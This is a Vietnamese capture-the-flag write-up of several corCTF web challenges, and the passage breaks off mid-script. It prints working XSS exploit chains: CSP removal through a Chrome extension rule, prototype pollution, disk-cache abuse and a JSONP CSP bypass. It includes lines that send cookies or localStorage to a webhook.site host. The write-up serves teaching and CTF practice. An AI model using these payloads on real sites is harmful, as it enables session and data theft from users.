<p>Context của bài là ta có một bug XSS nhưng không thể bypass được CSP, ta sẽ lợi dụng một lỗi trong chrome extension của bài cho phép ta ghi dynamic rule vào <code>declarativenetrequest</code> nhằm xóa đi header CSP và thực hiện XSS</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/01d148a9-8e1f-466d-b0e6-60a2e2fe0d23" alt="image" />
    
  </figure>
</p>
<p><code>document.getElementById('block-options')</code> sẽ lấy phần tử đầu tiên với id <code>block-options</code> mà nó tìm thấy, do đó nếu extension đặt form ở đầu tag <code>body</code> thì ta chỉ việc đặt form của ta ở tag <code>head</code>, sau đó trigger button <code>submit-btn</code> là được. Rule của ta sẽ được merge vào <code>base_rule</code> và được register vào dynamic rules của <code>declarativenetrequest</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/0e9a1bb0-e703-4ce9-8db6-e71a816ec8e3" alt="image" />
    
  </figure>
</p>
<p>Hàm <code>serializeForm</code> như sau:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/89029748-8609-45d3-a947-96987d384b3e" alt="image" />
    
  </figure>
</p>
<p>Vậy chỉ cần form data của ta có key dạng <code>action.type</code> là sẽ có thể ghi đè được giá trị của <code>type</code>, đối với array thì là <code>a.b.0.c</code>. Tới đây ta có thể ghi một rule với action <code>modifyHeaders</code> (<a href="https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest#header_modification" target="_blank">https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest#header_modification</a>) để xóa đi CSP header, từ đó ta có thể thực hiện XSS để lấy cookie.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;header&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;span class=&#34;close&#34;&gt;&amp;times;&lt;/span&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;form name=&#34;aaa&#34; id=&#39;block-options&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;priority&#39; name=&#39;priority&#39; value=&#39;2&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;1&#39; name=&#39;action.type&#39; value=&#39;modifyHeaders&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a2a&#39; name=&#39;action.responseHeaders.0.header&#39; value=&#39;content-security-policy&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a3a&#39; name=&#39;action.responseHeaders.0.operation&#39; value=&#39;remove&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a4a&#39; name=&#39;condition.resourceTypes.0&#39; value=&#39;main_frame&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a5a&#39; name=&#39;action.requestHeaders.0.header&#39; value=&#39;user-agent&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a6a&#39; name=&#39;action.requestHeaders.0.operation&#39; value=&#39;remove&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a8a&#39; name=&#39;condition.resourceTypes.0&#39; value=&#39;main_frame&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a9a&#39; name=&#39;condition.resourceTypes.1&#39; value=&#39;sub_frame&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a0a&#39; name=&#39;condition.resourceTypes.2&#39; value=&#39;script&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a11a&#39; name=&#39;condition.resourceTypes.3&#39; value=&#39;other&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a22a&#39; name=&#39;condition.resourceTypes.4&#39; value=&#39;webtransport&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a33a&#39; name=&#39;condition.resourceTypes.5&#39; value=&#39;xmlhttprequest&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">            &lt;input type=&#39;text&#39; id=&#39;a44a&#39; name=&#39;condition.initiatorDomains.0&#39; value=&#39;localhost&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;/form&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/header&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;head&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(</span><span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;#submit-btn&#34;</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="mi">1000</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">open</span><span class="p">(</span><span class="s2">&#34;/open.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="p">,</span> <span class="mi">2000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- &lt;meta http-equiv=&#34;refresh&#34; content=&#34;1; url=http://localhost:8080/challenge/3175c1a754da&#34;&gt; --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- &lt;script&gt;window.location=&#34;https://webhook.site/xxx/?c=&#34;+btoa(document.cookie) &lt;/script&gt; --&gt;</span>
</span></span></code></pre></div><p><code>open.html</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">&#34;http://localhost:8080/challenge/8f63f212e1f6&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Đầu tiên ta sẽ trigger ghi rule vào <code>chrome.storage.local</code>, sau đó thực hiện truy cập vào trang 1 lần nữa để background script của extension thực hiện register rule này</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/24503b29-9ce4-4550-a52b-36cd25f43d27" alt="image" />
    
  </figure>
</p>
<p>Mình tạo 2 note, 1 note chứa payload XSS và 1 note chứa payload redirect qua note còn lại, mục đích là để thỏa mãn điều kiện <code>initiatorDomains</code> do mình để là <code>http://localhost:8080</code>, ghi thực hiện redirect từ note 1 qua note 2 thì initiator sẽ là <code>http://localhost:8080</code> =&gt; điều kiện thỏa =&gt; CSP header bị remove =&gt; XSS</p>
<p>FLAG: <code>corctf{i_was_going_to_find_a_bug_in_ublock_but_it_was_easier_to_just_write_my_own_broken_extension}</code></p>


<h2 class="relative group">Iframe-note 
    <div id="iframe-note" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#iframe-note" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/d1f5c0ce-7ee9-4f17-82c0-26286e7582c2" alt="image" />
    
  </figure>
</p>
<p>Ở bài này ta sẽ chain client-side prototype pollution với một &ldquo;tính năng&rdquo; của werkzeug và sau đó abuse chrome disk cache để XSS</p>


<h3 class="relative group">Clide-side Prototype pollution 
    <div id="clide-side-prototype-pollution" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#clide-side-prototype-pollution" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/3ac9120f-38b0-4cda-824b-1e8c86c6c20d" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/8d3d8ed1-1b9a-4523-95cc-cf16a2d3ab75" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/eea23b04-9098-4211-8c6f-0c9719607c39" alt="image" />
    
  </figure>
</p>
<p>Phần bypass thì khá dễ, canjs thực hiện url decode trước khi thực hiện parse query string nên ta chỉ cần thay <code>__proto__</code> thành <code>__%70roto__</code>, đến đây thì mình bắt đầu đi tìm gadget trong axios, sài 1 tiếng mò mẫm thì có vẻ không có gadget nào cho phép ta ngay lập tức XSS được, mình đổi hướng sang việc control request gửi đi của axios để chain với một bug nào đó ở server side, giống như hint của author:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/cd371e13-f998-466f-8431-b5447def5fff" alt="image" />
    
  </figure>
</p>


<h3 class="relative group">Werkzeug 
    <div id="werkzeug" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#werkzeug" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Lúc đầu thì mình nghĩ là có thể có một bug nào đó giống bug của Kevin mizu (<a href="https://github.com/pallets/werkzeug/issues/2833%29" target="_blank">https://github.com/pallets/werkzeug/issues/2833)</a>, từ đó ta có thể làm chrome cache lại request với url của <code>/view/xxxxx</code> nhưng nội dung thì có chèn payload XSS vào, client side desync. Thế là mình bắt đầu ngồi tìm variations của bug này trong source của Werkzeug, nhưng mà cũng không tìm thấy gì nốt. Cuối cùng kết quả là Werkzeug có một header là <code>SCRIPT_NAME</code> cho phép control base URL của <code>url_for</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/210ebd3f-5ce2-42a4-8d37-513c30569beb" alt="image" />
    
  </figure>
</p>
<p>Thật ra cái này mình đã tìm ra từ đợt KCSC 2024, nhưng mà lâu quá không sài lại quên, khá cay&hellip; Anyway, từ đó ta có thể control được base url của script.</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/d12d4c02-2698-4b49-97c1-0a469280ab8d" alt="image" />
    
  </figure>
</p>
<p>Tuy nhiên thì đó chỉ là response được gửi về từ XHR, vậy làm sao để XSS? Đó là ta sẽ abuse chrome disk cache</p>


<h3 class="relative group">Chrome disk cache 
    <div id="chrome-disk-cache" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#chrome-disk-cache" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Chrome có 2 loại cache chính là bf cache và disk cache:</p>
<ul>
<li>back/forward cache (bf cache): cache lại snapshot hoàn chỉnh của page, trạng thái lúc đó ra sao đều sẽ được cache lại và sẽ được serve khi user back/forward trang</li>
<li>disk cache: chứa các resource được fetch về của trang, nhưng không kèm theo JavaScript heap, nghĩa là các script sẽ được execute lại. Được dùng trong một số trường hợp thay thế bf cache</li>
</ul>
<p>More at: <a href="https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote" target="_blank">https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote</a></p>
<p>Khi ta cho chrome thực hiện XHR request thì response được được cache lại, đưa vào disk cache, ta chỉ cần trigger disk cache khi back history lại là được</p>


<h3 class="relative group">Exploit 
    <div id="exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#exploit" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Nhìn vào source của axios ta sẽ biết có 3 adapter mà axios dùng để gửi request là <code>XHR</code>, <code>http</code> và <code>fetch</code>.</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/6ec5540d-f982-4e99-bd2f-da7b0d0d4a96" alt="image" />
    
  </figure>
</p>
<p>Nếu context là ở browser, axios sẽ prefer <code>XHR</code> hơn</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/2cc53f7e-8f5d-4797-9485-31a990484db9" alt="image" />
    
  </figure>
</p>
<p>Ta sẽ dùng prototype pollution để control header lúc gửi đi của XHR và <code>baseURL</code> của axios</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/b3512af2-98b1-4d0f-ae8e-78cb7ea987c4" alt="image" />
    
  </figure>
</p>
<p>payload sẽ như sau:</p>
<pre tabindex="0"><code>?__%70roto__[headers][SCRIPT_NAME]=data:text/javascript,alert(1)&amp;__%70roto__[baseURL]=data:text/javascript,alert(1)/
</code></pre><p>Sau khi response đã có trong cache ta có thể trigger disk cache để xss, đầu tiên thì khi page được open bởi <code>window.open</code> thì chrome sẽ ưu tiên sử dụng disk cache thay vì bfcache, full script của player <code>@_arkark</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// const BASE_URL = &#34;http://localhost:3000&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">BASE_URL</span> <span class="o">=</span> <span class="s2">&#34;https://iframe-note.be.ax&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">HOOK_URL</span> <span class="o">=</span> <span class="s2">&#34;https://webhook.site/xxxxx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">main</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">dataUrl</span> <span class="o">=</span> <span class="sb">`data:text/javascript,navigator.sendBeacon(&#39;</span><span class="si">${</span><span class="nx">HOOK_URL</span><span class="si">}</span><span class="sb">&#39;,JSON.stringify(localStorage))`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">win</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">BASE_URL</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">dataUrl</span><span class="si">}</span><span class="sb">/iframe/view`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">win</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">BASE_URL</span><span class="si">}</span><span class="sb">/view?id=view&amp;__%70roto__[headers][SCRIPT_NAME]=</span><span class="si">${</span><span class="nx">dataUrl</span><span class="si">}</span><span class="sb">/iframe&amp;__%70roto__[baseURL]=/</span><span class="si">${</span><span class="nx">dataUrl</span><span class="si">}</span><span class="sb">/`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">win</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="si">}</span><span class="sb">/back.html?n=2`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nx">main</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>back.html</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;n&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">history</span><span class="p">.</span><span class="nx">go</span><span class="p">(</span><span class="o">-</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Đầu tiên ta sẽ cho browser open 1 tab mới và truy cập đến <code>/data:text/javascript,alert(1)/iframe/view</code> để tạo 1 entry history, tiếp đó redirect tab đó đến URL chứa payload ở query string nhằm pollute prototype <code>Object</code> và fetch đến <code>/data:text/javascript,alert(1)/iframe/view</code>, lúc này thì ban đầu ta đã có một history của url <code>/data:text/javascript,alert(1)/iframe/view</code> rồi, cộng với việc response khi fetch đến <code>/data:text/javascript,alert(1)/iframe/view</code> lần này khác với lần đầu nếu browser sẽ invalidate cache cũ và đẩy cache mới vào, lúc này ta chỉ cần <code>history.go(-2)</code> để lùi history về 2 entry (entry của <code>/data:text/javascript,alert(1)/iframe/view</code>) và trigger disk cache đã lưu để trang được render và các script sẽ bắt đầu chạy</p>


<h2 class="relative group">corchat x 
    <div id="corchat-x" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#corchat-x" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/375f2567-c3f4-4edc-a546-a85cbfd40db8" alt="image" />
    
  </figure>
</p>
<p>Another shadow dom challenge, một ứng dụng chat sử dụng socket, ta sẽ cần bằng cách nào đó exfiltrate được flag nằm trong <code>src</code> của tag <code>img</code> bên trong một shadow dom và nằm trong một <code>about:blank</code> origin được mở bằng <code>window.open</code></p>
<p>Core concept của bài này đó là engine.io (engine được sử dụng bởi socket.io) sử dụng JSONP để broadcast message đến các socket</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/778857dd-17d6-46cf-b90e-f4524ead590c" alt="image" />
    
  </figure>
</p>
<p>Cùng nhìn qua CSP của bài</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/27e54170-49f0-4d12-b39b-18990babdcec" alt="image" />
    
  </figure>
</p>
<p>Vậy ta có thể dùng cách <code>&lt;script src=&quot;/socket.io/?EIO=4&amp;transport=polling&amp;t=bingus&amp;sid=&lt;sid&gt;&amp;j=0&quot;&gt;&lt;/script&gt;</code></p>


<h3 class="relative group">JSONP 
    <div id="jsonp" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#jsonp" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>JSONP là giải pháp để truyền tải JSON và &ldquo;bypass&rdquo; qua SOP, consumer chỉ cần setup 1 thẻ script trỏ src đến API endpoint, API endpoint này sẽ trả về một response chứa một đoạn JSON được wrap bởi một đoạn JS dùng để sử lý đoạn JSON đó. Cách này tiện cho cả developer và attack khi mà nó đã từng nhiều lần được sử dụng để bypass CSP:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="err">+</span><span class="na">src</span><span class="o">=</span><span class="s">&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Với payload như trên ta sẽ bypass qua được các CSP dạng <code>script-src 'self' https://*.google.com/</code>. Vậy quay lại bài trên, ta có thể thiết lập một socket connection, lấy sid thế vào URL bên trên kia rồi trỏ script src vào, nhưng như thế thì chưa đủ vì theo lẽ thông thường thì JSON sẽ được escape nên ta cũng không thể chèn JS vào trong đoạn JSONP được&hellip; nhưng trường hợp của engineio thì khác, cùng quan sát khi mình gửi <code>\&quot; aaa</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/33c9ddf3-efcf-4a42-adf0-4f8d0f9af0ed" alt="image" />
    
  </figure>
</p>
<p>Mình sẽ simulate lại sau khi data đi qua 1 hàm unescape:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/7965e476-e920-424c-8d5e-a1b7af9abb0d" alt="image" />
    
  </figure>
</p>
<p>Khá rõ ràng, dấu <code>\</code> ban nãy dường như đã bị engineio escape sai, vậy làm sao để ta lợi dùng điều này? Tạo 2 socket session, emit payload ở <code>\&quot; + alert(1));</code> ở session 1, session 2 sẽ dùng để trỏ script src đến polling endpoint của socketio, cụ thể như sau (original author: <code>Trixter</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socketio</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8080&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_sid</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">login</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/&#39;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">,</span> <span class="n">login</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/socket.io/&#39;</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;EIO&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;transport&#39;</span><span class="p">:</span> <span class="s1">&#39;polling&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="s1">&#39;bingus&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">socket_session</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;fake session&#39;</span><span class="p">,</span> <span class="n">socket_session</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/socket.io/&#39;</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;EIO&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;transport&#39;</span><span class="p">:</span> <span class="s1">&#39;polling&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="s1">&#39;P3qHGUZ&#39;</span><span class="p">,</span>
